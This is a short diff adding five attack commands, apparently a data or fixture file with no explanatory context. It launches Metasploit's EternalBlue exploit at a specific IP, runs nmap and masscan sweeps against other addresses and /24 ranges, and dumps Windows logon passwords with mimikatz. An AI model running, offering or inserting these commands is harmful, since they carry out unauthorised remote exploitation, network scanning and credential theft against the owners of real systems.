@@ -1,0 +1,5 @@
+msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 243.52.188.136; exploit'
+nmap -sV -p 1-1024 41.73.162.133
+mimikatz # sekurlsa::logonpasswords
+masscan 77.49.58.190/24 -p80,443,22,3389
+masscan 118.247.142.111/24 -p80,443,22,3389
